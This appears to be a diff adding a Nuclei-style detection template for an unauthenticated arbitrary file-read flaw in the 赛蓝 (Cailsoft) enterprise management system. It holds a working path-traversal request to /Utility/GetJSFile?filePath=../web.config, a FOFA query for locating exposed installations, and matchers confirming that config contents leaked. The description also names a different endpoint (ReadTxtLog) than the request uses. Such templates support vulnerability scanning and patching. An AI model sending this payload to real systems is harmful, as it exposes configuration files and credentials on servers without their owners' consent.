@@ -1,0 +1,31 @@
+id: NPoc-9
+
+info:
+  name: 赛蓝企业管理系统GetJSFile存在任意文件读取漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    赛蓝企业管理系统是一款为企业提供全面管理解决方案的软件系统，它能够帮助企业实现精细化管理，提高效率，降低成本。系统集成了多种管理功能，包括但不限于项目管理、财务管理、采购管理、销售管理以及报表分析等，旨在为企业提供一站式的管理解决方案。该系统以先进的管理思想为引导，结合企业实际业务流程，通过信息化手段提升企业管理水平。赛蓝企业管理系统ReadTxtLog接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+  tags: download
+request:
+ - raw:
+      - |
+        GET /Utility/GetJSFile?filePath=../web.config HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+        Connection: close
+   matchers-condition: and
+   matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0"'
+          - 'configSections'
+        condition: and   
